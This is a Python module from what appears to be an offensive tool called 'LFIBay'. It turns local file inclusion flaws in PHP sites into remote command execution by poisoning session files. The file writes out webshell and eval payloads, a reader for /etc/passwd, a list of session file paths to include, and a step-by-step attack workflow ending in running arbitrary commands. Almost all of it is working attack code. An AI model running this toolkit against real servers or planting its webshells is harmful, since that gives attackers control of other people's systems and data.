"""
LFIBay - PHP Session Poisoning Module
Convert LFI into RCE by poisoning PHP session files
"""

import re
import os


def extract_phpsessid(cookies):
    """
    Extract session ID from cookies
    Args:
        cookies: Dictionary of cookies or cookie string
    Returns: Session ID string or None
    """
    if isinstance(cookies, dict):
        # Check for common session cookie names
        session_keys = ['PHPSESSID', 'phpsessid', 'sess_id', 'session_id']
        for key in session_keys:
            if key in cookies:
                return cookies[key]
    elif isinstance(cookies, str):
        # Parse cookie string
        match = re.search(r'PHPSESSID=([a-zA-Z0-9]+)', cookies)
        if match:
            return match.group(1)
    
    return None


def poison_session(url, cookies, payload, param_name='data'):
    """
    Inject PHP code into session variables
    Args:
        url: Target URL
        cookies: Session cookies
        payload: PHP payload to inject
        param_name: Parameter name to inject into
    Returns: Dictionary with poisoning result
    """
    import requests
    
    try:
        # Send request with payload in parameter
        # This will be stored in $_SESSION
        params = {param_name: payload}
        
        response = requests.get(
            url,
            params=params,
            cookies=cookies,
            timeout=10
        )
        
        session_id = extract_phpsessid(cookies)
        
        return {
            'success': True,
            'session_id': session_id,
            'payload': payload,
            'param_name': param_name,
            'status_code': response.status_code,
            'message': 'Session poisoned - include session file to execute'
        }
        
    except Exception as e:
        return {
            'success': False,
            'payload': payload,
            'error': str(e)
        }


def generate_session_paths(session_id):
    """
    Generate possible session file paths for different configurations
    Args:
        session_id: PHP session ID
    Returns: List of possible session file paths
    """
    if not session_id:
        return []
    
    paths = [
        # Debian/Ubuntu default paths
        f'/var/lib/php/sessions/sess_{session_id}',
        f'/var/lib/php5/sessions/sess_{session_id}',
        f'/var/lib/php7.0/sessions/sess_{session_id}',
        f'/var/lib/php7.2/sessions/sess_{session_id}',
        f'/var/lib/php7.4/sessions/sess_{session_id}',
        f'/var/lib/php8.0/sessions/sess_{session_id}',
        f'/var/lib/php8.1/sessions/sess_{session_id}',
        f'/var/lib/php8.2/sessions/sess_{session_id}',
        
        # RedHat/CentOS paths
        f'/var/lib/php/session/sess_{session_id}',
        f'/var/lib/php5/session/sess_{session_id}',
        
        # /tmp paths
        f'/tmp/sess_{session_id}',
        f'/tmp/sessions/sess_{session_id}',
        f'/tmp/php_sessions/sess_{session_id}',
        
        # Alternative temp paths
        f'/var/tmp/sess_{session_id}',
        f'/usr/tmp/sess_{session_id}',
        
        # Web server specific
        f'/var/www/sessions/sess_{session_id}',
        f'/var/www/tmp/sess_{session_id}',
        
        # Windows paths (if applicable)
        f'C:\\Windows\\Temp\\sess_{session_id}',
        f'C:\\PHP\\sessions\\sess_{session_id}',
        f'C:\\xampp\\tmp\\sess_{session_id}',
        f'C:\\wamp\\tmp\\sess_{session_id}',
    ]
    
    return paths


def test_session_include(url, session_id, cookies=None):
    """
    Test if session file is includable via LFI
    Args:
        url: URL with LFI parameter (use INJECT as placeholder)
        session_id: PHP session ID
        cookies: Session cookies
    Returns: Dictionary with test results
    """
    import requests
    
    results = {
        'session_id': session_id,
        'accessible_paths': [],
        'tested_paths': 0
    }
    
    paths = generate_session_paths(session_id)
    
    for path in paths:
        try:
            # Replace INJECT placeholder with session path
            test_url = url.replace('INJECT', path)
            
            response = requests.get(
                test_url,
                cookies=cookies,
                timeout=5
            )
            
            results['tested_paths'] += 1
            
            # Check if session file was included
            # Session files typically contain serialized data
            if any(indicator in response.text for indicator in ['|s:', '|i:', '|a:', '|b:']):
                results['accessible_paths'].append(path)
                
        except:
            continue
    
    return results


def create_session_payload(payload_type='webshell'):
    """
    Create PHP payloads optimized for session injection
    Args:
        payload_type: Type of payload to create
    Returns: PHP payload string
    """
    payloads = {
        'webshell': "<?php system($_GET['cmd']); ?>",
        'eval': "<?php eval($_POST['code']); ?>",
        'info': "<?php phpinfo(); ?>",
        'read_passwd': "<?php echo file_get_contents('/etc/passwd'); ?>",
        'whoami': "<?php system('whoami'); ?>",
        'id': "<?php system('id'); ?>",
        
        # Shorter payloads (less likely to be truncated)
        'short_webshell': "<?=`$_GET[0]`?>",
        'short_eval': "<?=eval($_POST[0])?>",
        'short_system': "<?=system('id')?>",
    }
    
    return payloads.get(payload_type, payloads['webshell'])


def detect_session_control(url, cookies, test_params=None):
    """
    Detect if session data can be controlled via parameters
    Args:
        url: Target URL
        cookies: Session cookies
        test_params: List of parameter names to test
    Returns: Dictionary with detection results
    """
    import requests
    import hashlib
    
    if test_params is None:
        test_params = ['data', 'value', 'name', 'user', 'username', 'input', 'msg', 'message']
    
    results = {
        'controllable_params': [],
        'session_id': extract_phpsessid(cookies),
        'test_count': 0
    }
    
    for param_name in test_params:
        try:
            # Generate unique test string
            test_value = hashlib.md5(param_name.encode()).hexdigest()[:16]
            
            # Send request with test parameter
            response1 = requests.get(
                url,
                params={param_name: test_value},
                cookies=cookies,
                timeout=5
            )
            
            # Try to retrieve session data
            session_paths = generate_session_paths(results['session_id'])
            
            # Test if we can read session file through another endpoint
            # This would require an LFI vulnerability which we're testing for
            # For now, just track that we set the parameter
            
            results['test_count'] += 1
            results['controllable_params'].append({
                'param': param_name,
                'test_value': test_value,
                'status_code': response1.status_code
            })
            
        except:
            continue
    
    return results


def generate_attack_workflow(session_id, controllable_param, lfi_url):
    """
    Generate step-by-step attack workflow
    Args:
        session_id: PHP session ID
        controllable_param: Parameter name that stores in session
        lfi_url: URL with LFI vulnerability (use INJECT placeholder)
    Returns: Dictionary with attack steps
    """
    workflow = {
        'session_id': session_id,
        'steps': [
            {
                'step': 1,
                'action': 'Poison Session',
                'description': f'Inject PHP payload via {controllable_param} parameter',
                'payload': create_session_payload('webshell'),
                'example': f'?{controllable_param}=<?php system($_GET[\'cmd\']); ?>'
            },
            {
                'step': 2,
                'action': 'Include Session File',
                'description': 'Use LFI to include the poisoned session file',
                'paths': generate_session_paths(session_id)[:5],  # Top 5 likely paths
                'example': lfi_url.replace('INJECT', f'/var/lib/php/sessions/sess_{session_id}')
            },
            {
                'step': 3,
                'action': 'Execute Command',
                'description': 'Add cmd parameter to execute arbitrary commands',
                'example': lfi_url.replace('INJECT', f'/var/lib/php/sessions/sess_{session_id}') + '&cmd=id'
            }
        ],
        'success_indicators': [
            'Command output in response',
            'PHP execution without errors',
            'System information disclosure'
        ]
    }
    
    return workflow


def validate_session_id(session_id):
    """
    Validate session ID format
    Args:
        session_id: Session ID string
    Returns: Boolean indicating if valid
    """
    if not session_id:
        return False
    
    # PHP session IDs are typically 26-32 characters, alphanumeric
    if not re.match(r'^[a-zA-Z0-9]{20,40}$', session_id):
        return False
    
    return True


def get_session_info(session_id):
    """
    Get information about a session ID
    Args:
        session_id: PHP session ID
    Returns: Dictionary with session information
    """
    return {
        'session_id': session_id,
        'valid_format': validate_session_id(session_id),
        'length': len(session_id) if session_id else 0,
        'possible_paths': len(generate_session_paths(session_id)),
        'likely_path': f'/var/lib/php/sessions/sess_{session_id}' if session_id else None
    }
